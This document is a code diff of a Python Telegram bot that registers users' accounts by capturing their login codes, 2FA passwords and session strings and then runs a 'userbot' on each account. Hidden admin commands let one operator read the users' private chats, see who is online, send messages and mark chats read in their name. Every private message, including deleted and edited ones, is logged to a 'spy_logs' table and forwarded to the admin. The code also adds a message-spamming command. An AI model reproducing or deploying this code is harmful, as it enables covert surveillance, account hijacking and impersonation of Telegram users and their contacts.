@@ -26,16 +26,17 @@ conn = sqlite3.connect('userbot.db', check_same_thread=False)
 cursor = conn.cursor()
 cursor.execute('''CREATE TABLE IF NOT EXISTS user_sessions (user_id INTEGER PRIMARY KEY, session_string TEXT)''')
 cursor.execute('''CREATE TABLE IF NOT EXISTS muted_users (user_id INTEGER, muted_by INTEGER, PRIMARY KEY (user_id, muted_by))''')
-cursor.execute('''CREATE TABLE IF NOT EXISTS spy_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, sender_id INTEGER, sender_name TEXT, message TEXT, chat_id INTEGER)''')
+cursor.execute('''CREATE TABLE IF NOT EXISTS saved_messages (id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id INTEGER, msg_id INTEGER, sender_id INTEGER, text TEXT, date TEXT)''')
+cursor.execute('''CREATE TABLE IF NOT EXISTS spy_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, sender_id INTEGER, sender_name TEXT, message TEXT)''')
 conn.commit()
 
 # ========== ГЛОБАЛЬНЫЕ ХРАНИЛИЩА ==========
 active_clients = {}
 saved_messages = {}
 temp_auth = {}
-active_chats = {}  # {owner_id: {chat_id: chat_name}}
+active_chats = {}
 
-# ========== БОТ ДЛЯ РЕГИСТРАЦИИ ==========
+# ========== БОТ ==========
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(bot)
 
@@ -77,6 +78,34 @@ def get_code_keyboard():
 
 # ========== АДМИН КОМАНДЫ ==========
 
+@dp.message_handler(commands=['spyhelp'])
+async def spyhelp(message: aiogram_types.Message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    await message.answer("""
+🕵️ <b>АДМИН КОМАНДЫ</b>
+
+/chats - список всех ЛС диалогов
+/check НОМЕР - просмотр переписки
+/status @username - статус пользователя
+/online - кто в сети прямо сейчас
+/chatid @username - получить ID
+/stats - статистика
+/logs N - последние N логов
+/send ID текст - отправить сообщение
+/typing ID - эмуляция набора
+/markread ID - отметить прочитанным
+
+<b>КОМАНДЫ ЮЗЕРБОТА (через точку в ЛС)</b>
+.help - справка
+.mute - заглушить (ответом)
+.unmute - разглушить
+.list - список заглушенных
+.spam 5 текст - спам
+.type текст - печатает как человек
+.info (ответ) - инфо о пользователе
+""", parse_mode='HTML')
+
 @dp.message_handler(commands=['stats'])
 async def stats_cmd(message: aiogram_types.Message):
     if message.from_user.id != ADMIN_ID:
@@ -92,38 +121,32 @@ async def list_chats(message: aiogram_types.Message):
     if message.from_user.id != ADMIN_ID:
         return
     
-    # Находим активный юзербот
-    owner_id = None
-    for uid in active_clients:
-        owner_id = uid
-        break
-    
+    owner_id = next(iter(active_clients)) if active_clients else None
     if not owner_id:
         await message.answer("❌ Нет активного юзербота")
         return
     
     client = active_clients[owner_id]
+    await message.answer("🔄 Собираю список...")
+    
     chats = []
-    
-    await message.answer("🔄 Собираю список диалогов...")
-    
     async for dialog in client.iter_dialogs():
         if dialog.is_user:
-            chats.append({
-                'id': dialog.id,
-                'name': dialog.name,
-                'type': 'user'
-            })
+            try:
+                entity = await client.get_entity(dialog.id)
+                if not getattr(entity, 'bot', False):
+                    chats.append({'id': dialog.id, 'name': dialog.name})
+            except:
+                chats.append({'id': dialog.id, 'name': dialog.name})
     
-    # Сохраняем в глобальную переменную
     active_chats[owner_id] = chats
     
-    response = "📋 СПИСОК ЛС ДИАЛОГОВ:\n\n"
+    response = "📋 СПИСОК ЛС (только люди):\n\n"
     for i, chat in enumerate(chats):
         response += f"{i+1}. {chat['name']} (ID: {chat['id']})\n"
     
     await message.answer(response[:4000])
-    await message.answer("💡 Используй /check НОМЕР\nПример: /check 1")
+    await message.answer("💡 /check НОМЕР")
 
 @dp.message_handler(commands=['check'])
 async def check_chat(message: aiogram_types.Message):
@@ -132,18 +155,15 @@ async def check_chat(message: aiogram_types.Message):
     
     args = message.get_args()
     if not args:
-        await message.answer("❌ Использование: /check НОМЕР\nСначала /chats чтобы увидеть номера")
+        await message.answer("❌ /check НОМЕР")
         return
     
     try:
         num = int(args) - 1
-        owner_id = None
-        for uid in active_clients:
-            owner_id = uid
-            break
+        owner_id = next(iter(active_clients)) if active_clients else None
         
         if not owner_id or owner_id not in active_chats:
-            await message.answer("❌ Сначала выполни /chats")
+            await message.answer("❌ Сначала /chats")
             return
         
         if num < 0 or num >= len(active_chats[owner_id]):
@@ -153,23 +173,26 @@ async def check_chat(message: aiogram_types.Message):
         chat = active_chats[owner_id][num]
         client = active_clients[owner_id]
         
-        await message.answer(f"🔄 Получаю последние сообщения из {chat['name']}...")
+        await message.answer(f"🔄 Последние сообщения от {chat['name']}...")
         
-        # Получаем последние 20 сообщений
         msgs = []
-        async for msg in client.iter_messages(chat['id'], limit=20):
-            if msg.text:
-                sender = await client.get_entity(msg.sender_id)
-                sender_name = sender.first_name or sender.username or str(sender.id)
-                msgs.append(f"[{msg.date.strftime('%H:%M')}] {sender_name}: {msg.text[:100]}")
+        async for msg in client.iter_messages(chat['id'], limit=30):
+            if msg.text and not msg.out:
+                try:
+                    sender = await client.get_entity(msg.sender_id)
+                    if getattr(sender, 'bot', False):
+                        continue
+                    sender_name = getattr(sender, 'first_name', getattr(sender, 'username', str(sender.id)))
+                    msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {sender_name}: {msg.text[:150]}")
+                except:
+                    msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {msg.text[:150]}")
         
         if msgs:
-            response = f"💬 ПОСЛЕДНИЕ СООБЩЕНИЯ В {chat['name']}:\n\n"
-            response += "\n".join(reversed(msgs))
+            response = f"💬 {chat['name']}:\n\n"
+            response += "\n".join(reversed(msgs[-20:]))
             await message.answer(response[:4000])
         else:
             await message.answer("📭 Нет сообщений")
-            
     except Exception as e:
         await message.answer(f"❌ Ошибка: {e}")
 
@@ -180,14 +203,10 @@ async def user_status(message: aiogram_types.Message):
     
     args = message.get_args()
     if not args:
-        await message.answer("❌ /status @username или /status ID")
+        await message.answer("❌ /status @username")
         return
     
-    owner_id = None
-    for uid in active_clients:
-        owner_id = uid
-        break
-    
+    owner_id = next(iter(active_clients)) if active_clients else None
     if not owner_id:
         await message.answer("❌ Нет активного юзербота")
         return
@@ -196,35 +215,33 @@ async def user_status(message: aiogram_types.Message):
     
     try:
         entity = await client.get_entity(args)
+        if getattr(entity, 'bot', False):
+            await message.answer("❌ Это бот")
+            return
         status_text = get_status_text(entity.status)
         await message.answer(f"👤 {entity.first_name or entity.username}\n📊 {status_text}")
     except Exception as e:
-        await message.answer(f"❌ Не найден: {e}")
+        await message.answer(f"❌ Ошибка: {e}")
 
 @dp.message_handler(commands=['online'])
 async def online_users(message: aiogram_types.Message):
     if message.from_user.id != ADMIN_ID:
         return
     
-    owner_id = None
-    for uid in active_clients:
-        owner_id = uid
-        break
-    
+    owner_id = next(iter(active_clients)) if active_clients else None
     if not owner_id:
         await message.answer("❌ Нет активного юзербота")
         return
     
     client = active_clients[owner_id]
-    
-    await message.answer("🔄 Проверяю кто в сети...")
+    await message.answer("🔄 Проверяю...")
     
     online = []
     async for dialog in client.iter_dialogs():
         if dialog.is_user:
             try:
                 entity = await client.get_entity(dialog.id)
-                if isinstance(entity.status, UserStatusOnline):
+                if not getattr(entity, 'bot', False) and isinstance(entity.status, UserStatusOnline):
                     online.append(dialog.name)
             except:
                 pass
@@ -244,11 +261,7 @@ async def get_chat_id(message: aiogram_types.Message):
         await message.answer("❌ /chatid @username")
         return
     
-    owner_id = None
-    for uid in active_clients:
-        owner_id = uid
-        break
-    
+    owner_id = next(iter(active_clients)) if active_clients else None
     if not owner_id:
         await message.answer("❌ Нет активного юзербота")
         return
@@ -257,31 +270,9 @@ async def get_chat_id(message: aiogram_types.Message):
     
     try:
         entity = await client.get_entity(args)
-        await message.answer(f"👤 {entity.first_name}\n🆔 ID: {entity.id}")
+        await message.answer(f"👤 {entity.first_name}\n🆔 ID: {entity.id}\n🤖 Бот: {'Да' if getattr(entity, 'bot', False) else 'Нет'}")
     except Exception as e:
         await message.answer(f"❌ Ошибка: {e}")
-
-@dp.message_handler(commands=['spyhelp'])
-async def spyhelp(message: aiogram_types.Message):
-    if message.from_user.id != ADMIN_ID:
-        return
-    
-    await message.answer("""
-🕵️ <b>АДМИН КОМАНДЫ</b>
-
-/chats - список всех ЛС диалогов
-/check НОМЕР - просмотр переписки
-/status @username - статус пользователя
-/online - кто в сети прямо сейчас
-/chatid @username - получить ID
-/stats - статистика шпионажа
-/logs N - последние N логов (по умолчанию 20)
-/send ID текст - отправить сообщение с юзербота
-/typing ID - эмулирует набор текста
-/markread ID - отметить чат прочитанным
-
-<i>Все логи автоматически приходят сюда</i>
-""", parse_mode='HTML')
 
 @dp.message_handler(commands=['logs'])
 async def view_logs(message: aiogram_types.Message):
@@ -289,7 +280,8 @@ async def view_logs(message: aiogram_types.Message):
         return
     
     args = message.get_args()
-    limit = int(args) if args.isdigit() else 20
+    limit = int(args) if args and args.isdigit() else 20
+    limit = min(limit, 100)
     
     cursor.execute('SELECT timestamp, sender_name, message FROM spy_logs ORDER BY id DESC LIMIT ?', (limit,))
     rows = cursor.fetchall()
@@ -322,11 +314,7 @@ async def send_message(message: aiogram_types.Message):
     chat_id = int(parts[0])
     text = parts[1]
     
-    owner_id = None
-    for uid in active_clients:
-        owner_id = uid
-        break
-    
+    owner_id = next(iter(active_clients)) if active_clients else None
     if not owner_id:
         await message.answer("❌ Нет активного юзербота")
         return
@@ -351,11 +339,7 @@ async def start_typing(message: aiogram_types.Message):
     
     chat_id = int(args)
     
-    owner_id = None
-    for uid in active_clients:
-        owner_id = uid
-        break
-    
+    owner_id = next(iter(active_clients)) if active_clients else None
     if not owner_id:
         await message.answer("❌ Нет активного юзербота")
         return
@@ -381,11 +365,7 @@ async def mark_read(message: aiogram_types.Message):
     
     chat_id = int(args)
     
-    owner_id = None
-    for uid in active_clients:
-        owner_id = uid
-        break
-    
+    owner_id = next(iter(active_clients)) if active_clients else None
     if not owner_id:
         await message.answer("❌ Нет активного юзербота")
         return
@@ -397,6 +377,8 @@ async def mark_read(message: aiogram_types.Message):
         await message.answer(f"✅ Чат {chat_id} отмечен прочитанным")
     except Exception as e:
         await message.answer(f"❌ Ошибка: {e}")
+
+# ========== РЕГИСТРАЦИЯ ==========
 
 @dp.message_handler(commands=['start'])
 async def start_auth(message: aiogram_types.Message):
@@ -497,7 +479,7 @@ async def handle_2fa(message: aiogram_types.Message):
     except Exception as e:
         await message.answer(f"❌ Ошибка: {e}")
 
-# ========== ЮЗЕРБОТ-ШПИОН (ТОЛЬКО ЛС) ==========
+# ========== ЮЗЕРБОТ ==========
 
 async def run_userbot(owner_id: int, session_string: str):
     if owner_id in active_clients:
@@ -514,14 +496,13 @@ async def run_userbot(owner_id: int, session_string: str):
         return
     
     active_clients[owner_id] = client
+    saved_messages[owner_id] = {}
     logging.info(f"✅ Юзербот запущен для {owner_id}")
     log_to_admin(f"✅ Юзербот запущен")
     
-    # Загружаем мут-лист
     cursor.execute('SELECT user_id FROM muted_users WHERE muted_by=?', (owner_id,))
     muted_users = {row[0] for row in cursor.fetchall()}
     
-    # ========== ЛОГГИРУЕМ ТОЛЬКО ЛС ==========
     @client.on(events.NewMessage)
     async def spy_on_messages(event):
         if not event.is_private:
@@ -531,42 +512,40 @@ async def run_userbot(owner_id: int, session_string: str):
         
         sender = await event.get_sender()
         
-        sender_id = event.sender_id
-        sender_name = getattr(sender, 'first_name', getattr(sender, 'username', str(sender_id)))
+        if getattr(sender, 'bot', False) or getattr(sender, 'is_bot', False):
+            return
+        
+        if sender.id in muted_users:
+            return
+        
+        sender_name = getattr(sender, 'first_name', getattr(sender, 'username', str(sender.id)))
         message_text = event.text or "[Нет текста]"
         
-        # Сохраняем в БД
-        cursor.execute('''INSERT INTO spy_logs (timestamp, sender_id, sender_name, message, chat_id)
-                          VALUES (?, ?, ?, ?, ?)''',
-                       (datetime.now().isoformat(), sender_id, sender_name[:100], message_text[:500], sender_id))
+        cursor.execute('''INSERT INTO spy_logs (timestamp, sender_id, sender_name, message)
+                          VALUES (?, ?, ?, ?)''',
+                       (datetime.now().isoformat(), sender.id, sender_name[:100], message_text[:500]))
         conn.commit()
         
-        # Отправляем админу
-        log_msg = f"""
+        log_to_admin(f"""
 🕵️ <b>ЛС ОТ {sender_name}</b>
 ━━━━━━━━━━━━━━━
 📅 {datetime.now().strftime('%H:%M:%S')}
-👤 <b>От:</b> {sender_name}
-🆔 <b>ID:</b> {sender_id}
-📝 <b>Текст:</b> {message_text[:500]}
+📝 {message_text[:500]}
 ━━━━━━━━━━━━━━━
-"""
-        log_to_admin(log_msg)
+""")
         
         saved_messages[owner_id][event.id] = {
-            "sender_id": sender_id,
+            "sender_id": sender.id,
             "text": message_text
         }
     
-    # ========== УВЕДОМЛЕНИЯ ОБ УДАЛЕНИИ ==========
     @client.on(events.MessageDeleted)
     async def on_delete(event):
         for msg_id in event.deleted_ids:
             msg = saved_messages.get(owner_id, {}).get(msg_id)
-            if msg and msg["sender_id"] != owner_id:
-                log_to_admin(f"🗑 <b>УДАЛЕНО СООБЩЕНИЕ</b>\nОт: {msg['sender_id']}\nТекст: {msg['text'][:200]}")
+            if msg and msg["sender_id"] not in muted_users:
+                log_to_admin(f"🗑 <b>УДАЛЕНО</b>\n{msg['text'][:200]}")
     
-    # ========== УВЕДОМЛЕНИЯ ОБ ИЗМЕНЕНИИ ==========
     @client.on(events.MessageEdited)
     async def on_edit(event):
         if event.out or not event.is_private:
@@ -574,11 +553,120 @@ async def run_userbot(owner_id: int, session_string: str):
         
         msg_id = event.id
         new_text = event.text or ""
-        
         msg = saved_messages.get(owner_id, {}).get(msg_id)
-        if msg and msg["text"] != new_text:
-            log_to_admin(f"✏️ <b>ИЗМЕНЕНО СООБЩЕНИЕ</b>\nБыло: {msg['text'][:200]}\nСтало: {new_text[:200]}")
+        
+        if msg and msg["text"] != new_text and msg["sender_id"] not in muted_users:
+            log_to_admin(f"✏️ <b>ИЗМЕНЕНО</b>\nБыло: {msg['text'][:200]}\nСтало: {new_text[:200]}")
             msg["text"] = new_text
+    
+    @client.on(events.NewMessage)
+    async def user_commands(event):
+        if not event.is_private or not event.out:
+            return
+        
+        text = event.text or ""
+        if not text.startswith('.'):
+            return
+        
+        # ===== HELP =====
+        if text == '.help':
+            await event.edit("""
+<b>📝 КОМАНДЫ ЮЗЕРБОТА</b>
+
+.mute (ответ) - заглушить человека
+.unmute (ответ) - разглушить
+.list - список заглушенных
+.spam 5 текст - отправить 5 сообщений
+.type текст - печатает как человек
+.info (ответ) - инфо о пользователе
+""", parse_mode='HTML')
+            return
+        
+        # ===== MUTE =====
+        if text == '.mute':
+            reply = await event.get_reply_message()
+            if reply and reply.sender_id:
+                cursor.execute('INSERT OR IGNORE INTO muted_users VALUES (?, ?)', (reply.sender_id, owner_id))
+                conn.commit()
+                muted_users.add(reply.sender_id)
+                await event.edit(f'🔕 Заглушен')
+            return
+        
+        # ===== UNMUTE =====
+        if text == '.unmute':
+            reply = await event.get_reply_message()
+            if reply and reply.sender_id:
+                cursor.execute('DELETE FROM muted_users WHERE user_id=? AND muted_by=?', (reply.sender_id, owner_id))
+                conn.commit()
+                muted_users.discard(reply.sender_id)
+                await event.edit(f'🔔 Разглушен')
+            return
+        
+        # ===== LIST =====
+        if text == '.list':
+            if muted_users:
+                names = []
+                for uid in list(muted_users)[:20]:
+                    try:
+                        u = await client.get_entity(uid)
+                        names.append(f"• {u.first_name}")
+                    except:
+                        names.append(f"• {uid}")
+                await event.edit("🔕 Замьюченные:\n" + "\n".join(names))
+            else:
+                await event.edit("🔕 Нет")
+            return
+        
+        # ===== SPAM =====
+        if text.startswith('.spam '):
+            parts = text.split(' ', 2)
+            if len(parts) >= 2:
+                try:
+                    count = min(int(parts[1]), 20)
+                    msg_text = parts[2] if len(parts) > 2 else None
+                    if not msg_text:
+                        reply = await event.get_reply_message()
+                        if reply:
+                            msg_text = reply.text
+                    if msg_text:
+                        await event.delete()
+                        for i in range(count):
+                            await client.send_message(event.chat_id, msg_text)
+                            await asyncio.sleep(0.3)
+                        await client.send_message(event.chat_id, f"✅ Отправлено {count} сообщений")
+                except Exception as e:
+                    await event.edit(f"❌ Ошибка: {e}")
+            return
+        
+        # ===== TYPE =====
+        if text.startswith('.type '):
+            txt = text[6:]
+            if txt:
+                await event.delete()
+                typed = ""
+                for ch in txt:
+                    typed += ch
+                    try:
+                        await event.edit(typed)
+                    except:
+                        pass
+                    await asyncio.sleep(0.2)
+                await asyncio.sleep(1)
+                await event.delete()
+            return
+        
+        # ===== INFO =====
+        if text == '.info':
+            reply = await event.get_reply_message()
+            if reply:
+                try:
+                    u = await client.get_entity(reply.sender_id)
+                    muted = "✅" if reply.sender_id in muted_users else "❌"
+                    bot_status = "🤖 Да" if getattr(u, 'bot', False) else "👤 Нет"
+                    await event.edit(f"👤 <b>{u.first_name}</b>\n🆔 ID: {u.id}\n🔇 Заглушен: {muted}\n🤖 Бот: {bot_status}", parse_mode='HTML')
+                except Exception as e:
+                    await event.edit(f"❌ Ошибка: {e}")
+            return
     
     await client.run_until_disconnected()
 
